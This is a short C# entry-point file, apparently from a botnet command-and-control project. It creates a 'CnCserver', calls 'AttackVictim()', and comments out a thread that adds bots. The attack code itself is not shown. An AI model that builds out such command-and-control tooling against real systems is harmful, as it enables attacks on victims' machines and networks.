using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Command_and_Control
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Title = "C&C";

            CnCserver cc = new CnCserver();
            cc.AttackVictim();
            //Thread searchBot = new Thread(() => { cc.AddBots(); });
            //searchBot.Start();

            Console.ReadLine();
        }
    }
}
